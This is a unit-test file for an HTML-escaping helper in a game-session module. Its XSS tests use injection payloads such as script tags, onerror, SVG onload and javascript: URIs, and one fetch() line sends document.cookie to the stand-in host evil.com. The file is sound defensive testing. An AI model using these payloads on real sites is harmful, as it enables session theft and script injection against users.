/**
 * HtmlUtils Unit Tests
 *
 * Tests for the HtmlUtils escapeHtml() function.
 * Covers HTML escaping for XSS prevention, edge cases, and special character handling.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest';

// Mock Logger before importing HtmlUtils
vi.mock('../../scripts/utils/Logger.mjs', () => ({
  Logger: {
    createChild: () => ({
      debug: vi.fn(),
      info: vi.fn(),
      log: vi.fn(),
      warn: vi.fn(),
      error: vi.fn()
    }),
    debug: vi.fn(),
    info: vi.fn(),
    log: vi.fn(),
    warn: vi.fn(),
    error: vi.fn()
  },
  LogLevel: {
    DEBUG: 0,
    INFO: 1,
    LOG: 2,
    WARN: 3,
    ERROR: 4,
    NONE: 5
  }
}));

// Mock MODULE_ID for Logger import chain
vi.mock('../../scripts/main.mjs', () => ({
  MODULE_ID: 'vox-chronicle'
}));

// Import after mocks are set up
import { escapeHtml } from '../../scripts/utils/HtmlUtils.mjs';

describe('HtmlUtils', () => {
  beforeEach(() => {
    vi.clearAllMocks();
  });

  // ============================================================================
  // escapeHtml - Basic Character Escaping
  // ============================================================================

  describe('escapeHtml - basic character escaping', () => {
    it('should escape ampersand (&)', () => {
      const result = escapeHtml('Tom & Jerry');
      expect(result).toBe('Tom &amp; Jerry');
    });

    it('should escape less than (<)', () => {
      const result = escapeHtml('5 < 10');
      expect(result).toBe('5 &lt; 10');
    });

    it('should escape greater than (>)', () => {
      const result = escapeHtml('10 > 5');
      expect(result).toBe('10 &gt; 5');
    });

    it('should escape double quotes (")', () => {
      const result = escapeHtml('She said "Hello"');
      expect(result).toBe('She said &quot;Hello&quot;');
    });

    it("should escape single quotes (')", () => {
      const result = escapeHtml("It's a test");
      expect(result).toBe('It&#039;s a test');
    });

    it('should escape all special characters together', () => {
      const result = escapeHtml('&<>"\' all special chars');
      expect(result).toBe('&amp;&lt;&gt;&quot;&#039; all special chars');
    });
  });

  // ============================================================================
  // escapeHtml - XSS Prevention
  // ============================================================================

  describe('escapeHtml - XSS prevention', () => {
    it('should prevent script tag injection', () => {
      const result = escapeHtml('<script>alert("XSS")</script>');
      expect(result).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(result).not.toContain('<script>');
    });

    it('should prevent img tag with onerror injection', () => {
      const result = escapeHtml('<img src="x" onerror="alert(\'XSS\')">');
      expect(result).toBe(
        '&lt;img src=&quot;x&quot; onerror=&quot;alert(&#039;XSS&#039;)&quot;&gt;'
      );
      expect(result).not.toContain('<img');
    });

    it('should prevent iframe injection', () => {
      const result = escapeHtml('<iframe src="javascript:alert(1)"></iframe>');
      expect(result).toBe('&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;');
      expect(result).not.toContain('<iframe');
    });

    it('should prevent onclick attribute injection', () => {
      const result = escapeHtml('<div onclick="alert(\'XSS\')">Click me</div>');
      expect(result).toBe(
        '&lt;div onclick=&quot;alert(&#039;XSS&#039;)&quot;&gt;Click me&lt;/div&gt;'
      );
      expect(result).not.toContain('<div');
    });

    it('should prevent HTML comment injection', () => {
      const result = escapeHtml('<!--<script>alert(1)</script>-->');
      expect(result).toBe('&lt;!--&lt;script&gt;alert(1)&lt;/script&gt;--&gt;');
      expect(result).not.toContain('<!--');
    });

    it('should prevent encoded script injection', () => {
      const result = escapeHtml('<scr<script>ipt>alert(1)</scr</script>ipt>');
      expect(result).toBe('&lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;');
      expect(result).not.toContain('<script>');
    });
  });

  // ============================================================================
  // escapeHtml - Edge Cases
  // ============================================================================

  describe('escapeHtml - edge cases', () => {
    it('should return empty string for null', () => {
      const result = escapeHtml(null);
      expect(result).toBe('');
    });

    it('should return empty string for undefined', () => {
      const result = escapeHtml(undefined);
      expect(result).toBe('');
    });

    it('should return empty string for empty string', () => {
      const result = escapeHtml('');
      expect(result).toBe('');
    });

    it('should handle plain text without special characters', () => {
      const result = escapeHtml('Hello World');
      expect(result).toBe('Hello World');
    });

    it('should handle numbers by converting to string', () => {
      const result = escapeHtml(12345);
      expect(result).toBe('12345');
    });

    it('should handle boolean true by converting to string', () => {
      const resultTrue = escapeHtml(true);
      expect(resultTrue).toBe('true');
    });

    it('should handle boolean false as falsy (returns empty string)', () => {
      const resultFalse = escapeHtml(false);
      expect(resultFalse).toBe('');
    });

    it('should handle objects by converting to string', () => {
      const obj = { toString: () => 'Custom Object' };
      const result = escapeHtml(obj);
      expect(result).toBe('Custom Object');
    });

    it('should handle whitespace-only strings', () => {
      const result = escapeHtml('   \n\t  ');
      expect(result).toBe('   \n\t  ');
    });
  });

  // ============================================================================
  // escapeHtml - Multiple Occurrences
  // ============================================================================

  describe('escapeHtml - multiple occurrences', () => {
    it('should escape multiple ampersands', () => {
      const result = escapeHtml('A & B & C & D');
      expect(result).toBe('A &amp; B &amp; C &amp; D');
    });

    it('should escape multiple angle brackets', () => {
      const result = escapeHtml('<<< >>> <<>>');
      expect(result).toBe('&lt;&lt;&lt; &gt;&gt;&gt; &lt;&lt;&gt;&gt;');
    });

    it('should escape multiple quotes', () => {
      const result = escapeHtml('"quote1" "quote2" \'quote3\'');
      expect(result).toBe('&quot;quote1&quot; &quot;quote2&quot; &#039;quote3&#039;');
    });

    it('should handle mixed special characters multiple times', () => {
      const result = escapeHtml('A&B<C>D"E\'F & G < H > I " J \' K');
      expect(result).toBe(
        'A&amp;B&lt;C&gt;D&quot;E&#039;F &amp; G &lt; H &gt; I &quot; J &#039; K'
      );
    });
  });

  // ============================================================================
  // escapeHtml - Real-World Use Cases
  // ============================================================================

  describe('escapeHtml - real-world use cases', () => {
    it('should escape user-provided character names', () => {
      const charName = 'Thorin "Oakenshield" <The Brave>';
      const result = escapeHtml(charName);
      expect(result).toBe('Thorin &quot;Oakenshield&quot; &lt;The Brave&gt;');
    });

    it('should escape location descriptions with special characters', () => {
      const description = "The Inn & Tavern - 'Best Ale in Town' <Est. 1842>";
      const result = escapeHtml(description);
      expect(result).toBe('The Inn &amp; Tavern - &#039;Best Ale in Town&#039; &lt;Est. 1842&gt;');
    });

    it('should escape speaker labels from transcription', () => {
      const speaker = 'SPEAKER_00: "Attack!" <rolls dice>';
      const result = escapeHtml(speaker);
      expect(result).toBe('SPEAKER_00: &quot;Attack!&quot; &lt;rolls dice&gt;');
    });

    it('should escape entity names with HTML-like syntax', () => {
      const entityName = '<Lord Vex> & The Shadow Warriors';
      const result = escapeHtml(entityName);
      expect(result).toBe('&lt;Lord Vex&gt; &amp; The Shadow Warriors');
    });

    it('should escape item descriptions with quotes and symbols', () => {
      const itemDesc = 'Sword of "Power" - Damage: 2d6+5 (magical)';
      const result = escapeHtml(itemDesc);
      expect(result).toBe('Sword of &quot;Power&quot; - Damage: 2d6+5 (magical)');
    });

    it('should escape malicious user input in chat messages', () => {
      const userInput = '<img src=x onerror="fetch(\'evil.com?cookie=\'+document.cookie)">';
      const result = escapeHtml(userInput);
      expect(result).toBe(
        '&lt;img src=x onerror=&quot;fetch(&#039;evil.com?cookie=&#039;+document.cookie)&quot;&gt;'
      );
      expect(result).not.toContain('<img');
      expect(result).not.toContain('onerror="');
    });
  });

  // ============================================================================
  // escapeHtml - Unicode and Special Content
  // ============================================================================

  describe('escapeHtml - unicode and special content', () => {
    it('should preserve unicode characters', () => {
      const result = escapeHtml('Hello 世界 🌍');
      expect(result).toBe('Hello 世界 🌍');
    });

    it('should escape special chars but preserve unicode', () => {
      const result = escapeHtml('Café & Restaurant <French> "Très Bien"');
      expect(result).toBe('Café &amp; Restaurant &lt;French&gt; &quot;Très Bien&quot;');
    });

    it('should handle emoji with special characters', () => {
      const result = escapeHtml('Attack! 🗡️ <Damage: 20> "Critical Hit!" 🎯');
      expect(result).toBe('Attack! 🗡️ &lt;Damage: 20&gt; &quot;Critical Hit!&quot; 🎯');
    });

    it('should handle newlines and tabs without escaping them', () => {
      const result = escapeHtml('Line 1\nLine 2\tTabbed');
      expect(result).toBe('Line 1\nLine 2\tTabbed');
    });
  });

  // ============================================================================
  // escapeHtml - Security Edge Cases
  // ============================================================================

  describe('escapeHtml - security edge cases', () => {
    it('should prevent nested XSS attempts', () => {
      const result = escapeHtml('<script><script>alert(1)</script></script>');
      expect(result).toBe('&lt;script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/script&gt;');
    });

    it('should prevent data URI injection', () => {
      const result = escapeHtml('<a href="data:text/html,<script>alert(1)</script>">Link</a>');
      expect(result).toBe(
        '&lt;a href=&quot;data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;Link&lt;/a&gt;'
      );
    });

    it('should prevent SVG injection', () => {
      const result = escapeHtml('<svg onload="alert(1)"></svg>');
      expect(result).toBe('&lt;svg onload=&quot;alert(1)&quot;&gt;&lt;/svg&gt;');
    });

    it('should prevent style tag injection', () => {
      const result = escapeHtml('<style>body{background:url("javascript:alert(1)")}</style>');
      expect(result).toBe(
        '&lt;style&gt;body{background:url(&quot;javascript:alert(1)&quot;)}&lt;/style&gt;'
      );
    });

    it('should escape already-escaped entities (double escaping)', () => {
      const result = escapeHtml('&lt;script&gt;');
      expect(result).toBe('&amp;lt;script&amp;gt;');
    });
  });

  // ============================================================================
  // escapeHtml - Performance and Long Strings
  // ============================================================================

  describe('escapeHtml - performance and long strings', () => {
    it('should handle long strings efficiently', () => {
      const longString = 'A'.repeat(10000) + '<script>' + 'B'.repeat(10000);
      const result = escapeHtml(longString);
      expect(result).toContain('&lt;script&gt;');
      // '<script>' (8 chars) becomes '&lt;script&gt;' (15 chars) = +7 chars
      // But we also need to account for the > which becomes &gt; (+3)
      // Actually: < becomes &lt; (+3), > becomes &gt; (+3) = +6 total
      expect(result.length).toBe(longString.length + 6);
    });

    it('should handle strings with many special characters', () => {
      const manySpecialChars = '&<>"\''.repeat(1000);
      const result = escapeHtml(manySpecialChars);
      expect(result).not.toContain('&<>"\'');
      expect(result).toMatch(/(&amp;|&lt;|&gt;|&quot;|&#039;)+/);
    });
  });
});
